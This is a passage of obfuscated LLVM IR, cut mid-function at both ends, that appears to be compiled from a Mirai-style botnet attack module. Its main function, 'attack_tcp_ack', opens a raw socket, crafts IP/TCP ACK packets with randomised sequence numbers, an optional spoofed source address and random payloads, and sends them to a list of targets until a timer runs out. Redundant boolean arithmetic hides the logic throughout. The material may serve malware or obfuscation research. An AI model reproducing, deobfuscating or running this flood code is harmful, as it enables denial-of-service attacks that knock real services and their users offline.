  %574 = zext i16 %573 to i32
  %575 = icmp eq i32 %574, 65535
  br i1 %575, label %576, label %589

; <label>:576:                                    ; preds = %572
  %577 = call i32 @rand_next()
  %578 = xor i32 %577, -1
  %579 = xor i32 65535, -1
  %580 = xor i32 269623833, -1
  %581 = or i32 %578, %579
  %582 = or i32 269623833, %580
  %583 = xor i32 %581, -1
  %584 = and i32 %583, %582
  %585 = and i32 %577, 65535
  %586 = trunc i32 %584 to i16
  %587 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 1
  store i16 %586, i16* %588, align 2
  br label %589

; <label>:589:                                    ; preds = %576, %572
  %590 = load i32, i32* %20, align 4
  %591 = icmp eq i32 %590, 65535
  br i1 %591, label %592, label %596

; <label>:592:                                    ; preds = %589
  %593 = call i32 @rand_next()
  %594 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 2
  store i32 %593, i32* %595, align 4
  br label %596

; <label>:596:                                    ; preds = %592, %589
  %597 = load i32, i32* %21, align 4
  %598 = icmp eq i32 %597, 65535
  br i1 %598, label %599, label %603

; <label>:599:                                    ; preds = %596
  %600 = call i32 @rand_next()
  %601 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %602 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %601, i32 0, i32 3
  store i32 %600, i32* %602, align 4
  br label %603

; <label>:603:                                    ; preds = %599, %596
  %604 = load i8, i8* %22, align 1
  %605 = icmp ne i8 %604, 0
  br i1 %605, label %606, label %619

; <label>:606:                                    ; preds = %603
  %607 = call i32 @rand_next()
  %608 = xor i32 %607, -1
  %609 = xor i32 65535, -1
  %610 = xor i32 1254363303, -1
  %611 = or i32 %608, %609
  %612 = or i32 1254363303, %610
  %613 = xor i32 %611, -1
  %614 = and i32 %613, %612
  %615 = and i32 %607, 65535
  %616 = trunc i32 %614 to i16
  %617 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %618 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %617, i32 0, i32 7
  store i16 %616, i16* %618, align 2
  br label %619

; <label>:619:                                    ; preds = %606, %603
  %620 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %621 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %620, i32 0, i32 7
  store i16 0, i16* %621, align 2
  %622 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %623 = bitcast %struct.iphdr* %622 to i16*
  %624 = call zeroext i16 @checksum_generic(i16* %623, i32 20)
  %625 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %626 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %625, i32 0, i32 7
  store i16 %624, i16* %626, align 2
  %627 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %628 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %627, i32 0, i32 6
  store i16 0, i16* %628, align 4
  %629 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %630 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %631 = bitcast %struct.tcphdr* %630 to i8*
  %632 = call zeroext i16 @htons(i16 zeroext 40) #7
  %633 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %629, i8* %631, i16 zeroext %632, i32 40)
  %634 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %635 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %634, i32 0, i32 6
  store i16 %633, i16* %635, align 4
  %636 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %637 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %636, i32 0, i32 1
  %638 = load i16, i16* %637, align 2
  %639 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %640 = load i32, i32* %11, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %639, i64 %641
  %643 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %642, i32 0, i32 0
  %644 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %643, i32 0, i32 1
  store i16 %638, i16* %644, align 2
  %645 = load i32, i32* %12, align 4
  %646 = load i8*, i8** %33, align 8
  %647 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %648 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %649 = load i32, i32* %11, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %648, i64 %650
  %652 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %651, i32 0, i32 0
  %653 = bitcast %struct.sockaddr_in* %652 to %struct.sockaddr*
  store %struct.sockaddr* %653, %struct.sockaddr** %647, align 8
  %654 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %655 = load %struct.sockaddr*, %struct.sockaddr** %654, align 8
  %656 = call i64 @sendto(i32 %645, i8* %646, i64 60, i32 16384, %struct.sockaddr* %655, i32 16)
  br label %657

; <label>:657:                                    ; preds = %619
  %658 = load i32, i32* %11, align 4
  %659 = sub i32 0, 1
  %660 = sub i32 %658, %659
  %661 = add nsw i32 %658, 1
  store i32 %660, i32* %11, align 4
  br label %487

; <label>:662:                                    ; preds = %487
  %663 = call i64 @time(i64* null) #6
  %664 = load i32, i32* %29, align 4
  %665 = sext i32 %664 to i64
  %666 = icmp sgt i64 %663, %665
  br i1 %666, label %667, label %668

; <label>:667:                                    ; preds = %662
  br label %669

; <label>:668:                                    ; preds = %662
  br label %486

; <label>:669:                                    ; preds = %667, %116, %110
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = sub i64 0, %111
  %113 = sub i64 %109, %112
  %114 = add nsw i64 %109, %111
  %115 = trunc i64 %113 to i32
  store i32 %115, i32* %31, align 4
  %116 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %116, i32* %12, align 4
  %117 = icmp eq i32 %116, -1
  br i1 %117, label %118, label %119

; <label>:118:                                    ; preds = %5
  br label %686

; <label>:119:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %120 = load i32, i32* %12, align 4
  %121 = bitcast i32* %11 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #6
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %127

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* %12, align 4
  %126 = call i32 @close(i32 %125)
  br label %686

; <label>:127:                                    ; preds = %119
  store i32 0, i32* %11, align 4
  br label %128

; <label>:128:                                    ; preds = %479, %127
  %129 = load i32, i32* %11, align 4
  %130 = load i8, i8* %7, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br i1 %132, label %133, label %485

; <label>:133:                                    ; preds = %128
  %134 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %135 = load i8**, i8*** %13, align 8
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %32, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.tcphdr*
  store %struct.tcphdr* %147, %struct.tcphdr** %33, align 8
  %148 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i64 1
  %150 = bitcast %struct.tcphdr* %149 to i8*
  store i8* %150, i8** %34, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %152 = bitcast %struct.iphdr* %151 to i8*
  %153 = load i8, i8* %152, align 4
  %154 = xor i8 %153, -1
  %155 = xor i8 15, -1
  %156 = xor i8 106, -1
  %157 = or i8 %154, %155
  %158 = or i8 106, %156
  %159 = xor i8 %157, -1
  %160 = and i8 %159, %158
  %161 = and i8 %153, 15
  %162 = and i8 %160, 64
  %163 = xor i8 %160, 64
  %164 = or i8 %162, %163
  %165 = or i8 %160, 64
  store i8 %164, i8* %152, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %167 = bitcast %struct.iphdr* %166 to i8*
  %168 = load i8, i8* %167, align 4
  %169 = xor i8 %168, -1
  %170 = xor i8 -16, -1
  %171 = xor i8 102, -1
  %172 = or i8 %169, %170
  %173 = or i8 102, %171
  %174 = xor i8 %172, -1
  %175 = and i8 %174, %173
  %176 = and i8 %168, -16
  %177 = xor i8 %175, -1
  %178 = xor i8 5, -1
  %179 = xor i8 103, -1
  %180 = and i8 %177, 103
  %181 = and i8 %175, %179
  %182 = and i8 %178, 103
  %183 = and i8 5, %179
  %184 = or i8 %180, %181
  %185 = or i8 %182, %183
  %186 = xor i8 %184, %185
  %187 = or i8 %177, %178
  %188 = xor i8 %187, -1
  %189 = or i8 103, %179
  %190 = and i8 %188, %189
  %191 = or i8 %186, %190
  %192 = or i8 %175, 5
  store i8 %191, i8* %167, align 4
  %193 = load i8, i8* %14, align 1
  %194 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 1
  store i8 %193, i8* %195, align 1
  %196 = load i32, i32* %28, align 4
  %197 = sext i32 %196 to i64
  %198 = sub i64 40, -427195025433031356
  %199 = add i64 %198, %197
  %200 = add i64 %199, -427195025433031356
  %201 = add i64 40, %197
  %202 = trunc i64 %200 to i16
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 2
  store i16 %203, i16* %205, align 2
  %206 = load i16, i16* %15, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 3
  store i16 %207, i16* %209, align 4
  %210 = load i8, i8* %16, align 1
  %211 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 5
  store i8 %210, i8* %212, align 4
  %213 = load i8, i8* %17, align 1
  %214 = icmp ne i8 %213, 0
  br i1 %214, label %215, label %219

; <label>:215:                                    ; preds = %133
  %216 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %217 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 4
  store i16 %216, i16* %218, align 2
  br label %219

; <label>:219:                                    ; preds = %215, %133
  %220 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 6
  store i8 6, i8* %221, align 1
  %222 = load i32, i32* %30, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  store i32 %222, i32* %224, align 4
  %225 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %226 = load i32, i32* %11, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i64 %227
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i32 0, i32 1
  %230 = load i32, i32* %229, align 4
  %231 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 9
  store i32 %230, i32* %232, align 4
  %233 = load i16, i16* %18, align 2
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  store i16 %234, i16* %236, align 4
  %237 = load i16, i16* %19, align 2
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 1
  store i16 %238, i16* %240, align 2
  %241 = load i32, i32* %20, align 4
  %242 = trunc i32 %241 to i16
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = zext i16 %243 to i32
  %245 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 2
  store i32 %244, i32* %246, align 4
  %247 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = xor i16 -241, -1
  %251 = xor i16 %249, %250
  %252 = and i16 %251, %249
  %253 = and i16 %249, -241
  %254 = and i16 %252, 80
  %255 = xor i16 %252, 80
  %256 = or i16 %254, %255
  %257 = or i16 %252, 80
  store i16 %256, i16* %248, align 4
  %258 = load i8, i8* %22, align 1
  %259 = sext i8 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = xor i16 1, -1
  %264 = xor i16 %259, %263
  %265 = and i16 %264, %259
  %266 = and i16 %259, 1
  %267 = shl i16 %265, 13
  %268 = xor i16 -8193, -1
  %269 = xor i16 %262, %268
  %270 = and i16 %269, %262
  %271 = and i16 %262, -8193
  %272 = and i16 %270, %267
  %273 = xor i16 %270, %267
  %274 = or i16 %272, %273
  %275 = or i16 %270, %267
  store i16 %274, i16* %261, align 4
  %276 = load i8, i8* %23, align 1
  %277 = sext i8 %276 to i16
  %278 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 4
  %280 = load i16, i16* %279, align 4
  %281 = xor i16 %277, -1
  %282 = xor i16 1, -1
  %283 = xor i16 26883, -1
  %284 = or i16 %281, %282
  %285 = or i16 26883, %283
  %286 = xor i16 %284, -1
  %287 = and i16 %286, %285
  %288 = and i16 %277, 1
  %289 = shl i16 %287, 12
  %290 = xor i16 %280, -1
  %291 = xor i16 -4097, -1
  %292 = xor i16 24608, -1
  %293 = or i16 %290, %291
  %294 = or i16 24608, %292
  %295 = xor i16 %293, -1
  %296 = and i16 %295, %294
  %297 = and i16 %280, -4097
  %298 = and i16 %296, %289
  %299 = xor i16 %296, %289
  %300 = or i16 %298, %299
  %301 = or i16 %296, %289
  store i16 %300, i16* %279, align 4
  %302 = load i8, i8* %24, align 1
  %303 = sext i8 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = xor i16 1, -1
  %308 = xor i16 %303, %307
  %309 = and i16 %308, %303
  %310 = and i16 %303, 1
  %311 = shl i16 %309, 11
  %312 = xor i16 %306, -1
  %313 = xor i16 -2049, -1
  %314 = xor i16 -13665, -1
  %315 = or i16 %312, %313
  %316 = or i16 -13665, %314
  %317 = xor i16 %315, -1
  %318 = and i16 %317, %316
  %319 = and i16 %306, -2049
  %320 = xor i16 %318, -1
  %321 = xor i16 %311, -1
  %322 = xor i16 -19798, -1
  %323 = and i16 %320, -19798
  %324 = and i16 %318, %322
  %325 = and i16 %321, -19798
  %326 = and i16 %311, %322
  %327 = or i16 %323, %324
  %328 = or i16 %325, %326
  %329 = xor i16 %327, %328
  %330 = or i16 %320, %321
  %331 = xor i16 %330, -1
  %332 = or i16 -19798, %322
  %333 = and i16 %331, %332
  %334 = or i16 %329, %333
  %335 = or i16 %318, %311
  store i16 %334, i16* %305, align 4
  %336 = load i8, i8* %25, align 1
  %337 = sext i8 %336 to i16
  %338 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i32 0, i32 4
  %340 = load i16, i16* %339, align 4
  %341 = xor i16 1, -1
  %342 = xor i16 %337, %341
  %343 = and i16 %342, %337
  %344 = and i16 %337, 1
  %345 = shl i16 %343, 10
  %346 = xor i16 -1025, -1
  %347 = xor i16 %340, %346
  %348 = and i16 %347, %340
  %349 = and i16 %340, -1025
  %350 = xor i16 %348, -1
  %351 = xor i16 %345, -1
  %352 = xor i16 -15089, -1
  %353 = and i16 %350, -15089
  %354 = and i16 %348, %352
  %355 = and i16 %351, -15089
  %356 = and i16 %345, %352
  %357 = or i16 %353, %354
  %358 = or i16 %355, %356
  %359 = xor i16 %357, %358
  %360 = or i16 %350, %351
  %361 = xor i16 %360, -1
  %362 = or i16 -15089, %352
  %363 = and i16 %361, %362
  %364 = or i16 %359, %363
  %365 = or i16 %348, %345
  store i16 %364, i16* %339, align 4
  %366 = load i8, i8* %26, align 1
  %367 = sext i8 %366 to i16
  %368 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %369 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %368, i32 0, i32 4
  %370 = load i16, i16* %369, align 4
  %371 = xor i16 %367, -1
  %372 = xor i16 1, -1
  %373 = xor i16 -29772, -1
  %374 = or i16 %371, %372
  %375 = or i16 -29772, %373
  %376 = xor i16 %374, -1
  %377 = and i16 %376, %375
  %378 = and i16 %367, 1
  %379 = shl i16 %377, 9
  %380 = xor i16 %370, -1
  %381 = xor i16 -513, -1
  %382 = xor i16 2616, -1
  %383 = or i16 %380, %381
  %384 = or i16 2616, %382
  %385 = xor i16 %383, -1
  %386 = and i16 %385, %384
  %387 = and i16 %370, -513
  %388 = xor i16 %386, -1
  %389 = xor i16 %379, -1
  %390 = xor i16 -9940, -1
  %391 = and i16 %388, -9940
  %392 = and i16 %386, %390
  %393 = and i16 %389, -9940
  %394 = and i16 %379, %390
  %395 = or i16 %391, %392
  %396 = or i16 %393, %394
  %397 = xor i16 %395, %396
  %398 = or i16 %388, %389
  %399 = xor i16 %398, -1
  %400 = or i16 -9940, %390
  %401 = and i16 %399, %400
  %402 = or i16 %397, %401
  %403 = or i16 %386, %379
  store i16 %402, i16* %369, align 4
  %404 = load i8, i8* %27, align 1
  %405 = sext i8 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = xor i16 1, -1
  %410 = xor i16 %405, %409
  %411 = and i16 %410, %405
  %412 = and i16 %405, 1
  %413 = shl i16 %411, 8
  %414 = xor i16 -257, -1
  %415 = xor i16 %408, %414
  %416 = and i16 %415, %408
  %417 = and i16 %408, -257
  %418 = xor i16 %416, -1
  %419 = xor i16 %413, -1
  %420 = xor i16 -17010, -1
  %421 = and i16 %418, -17010
  %422 = and i16 %416, %420
  %423 = and i16 %419, -17010
  %424 = and i16 %413, %420
  %425 = or i16 %421, %422
  %426 = or i16 %423, %424
  %427 = xor i16 %425, %426
  %428 = or i16 %418, %419
  %429 = xor i16 %428, -1
  %430 = or i16 -17010, %420
  %431 = and i16 %429, %430
  %432 = or i16 %427, %431
  %433 = or i16 %416, %413
  store i16 %432, i16* %407, align 4
  %434 = call i32 @rand_next()
  %435 = xor i32 65535, -1
  %436 = xor i32 %434, %435
  %437 = and i32 %436, %434
  %438 = and i32 %434, 65535
  %439 = trunc i32 %437 to i16
  %440 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 5
  store i16 %439, i16* %441, align 2
  %442 = load i8, i8* %24, align 1
  %443 = icmp ne i8 %442, 0
  br i1 %443, label %444, label %472

; <label>:444:                                    ; preds = %219
  %445 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %446 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %445, i32 0, i32 4
  %447 = load i16, i16* %446, align 4
  %448 = xor i16 %447, -1
  %449 = xor i16 -2049, -1
  %450 = xor i16 -25238, -1
  %451 = or i16 %448, %449
  %452 = or i16 -25238, %450
  %453 = xor i16 %451, -1
  %454 = and i16 %453, %452
  %455 = and i16 %447, -2049
  %456 = xor i16 %454, -1
  %457 = xor i16 2048, -1
  %458 = xor i16 11171, -1
  %459 = and i16 %456, 11171
  %460 = and i16 %454, %458
  %461 = and i16 %457, 11171
  %462 = and i16 2048, %458
  %463 = or i16 %459, %460
  %464 = or i16 %461, %462
  %465 = xor i16 %463, %464
  %466 = or i16 %456, %457
  %467 = xor i16 %466, -1
  %468 = or i16 11171, %458
  %469 = and i16 %467, %468
  %470 = or i16 %465, %469
  %471 = or i16 %454, 2048
  store i16 %470, i16* %446, align 4
  br label %472

; <label>:472:                                    ; preds = %444, %219
  %473 = load i8*, i8** %34, align 8
  %474 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %473, i32 %474)
  %475 = load i8*, i8** %34, align 8
  %476 = load i32, i32* %28, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds i8, i8* %475, i64 %477
  store i8 0, i8* %478, align 1
  br label %479

; <label>:479:                                    ; preds = %472
  %480 = load i32, i32* %11, align 4
  %481 = sub i32 %480, 13818524
  %482 = add i32 %481, 1
  %483 = add i32 %482, 13818524
  %484 = add nsw i32 %480, 1
  store i32 %483, i32* %11, align 4
  br label %128

; <label>:485:                                    ; preds = %128
  br label %486

; <label>:486:                                    ; preds = %685, %485
  store i32 0, i32* %11, align 4
  br label %487

; <label>:487:                                    ; preds = %673, %486
  %488 = load i32, i32* %11, align 4
  %489 = load i8, i8* %7, align 1
  %490 = zext i8 %489 to i32
  %491 = icmp slt i32 %488, %490
  br i1 %491, label %492, label %679

; <label>:492:                                    ; preds = %487
  %493 = load i8**, i8*** %13, align 8
  %494 = load i32, i32* %11, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds i8*, i8** %493, i64 %495
  %497 = load i8*, i8** %496, align 8
  store i8* %497, i8** %35, align 8
  %498 = load i8*, i8** %35, align 8
  %499 = bitcast i8* %498 to %struct.iphdr*
  store %struct.iphdr* %499, %struct.iphdr** %36, align 8
  %500 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i64 1
  %502 = bitcast %struct.iphdr* %501 to %struct.tcphdr*
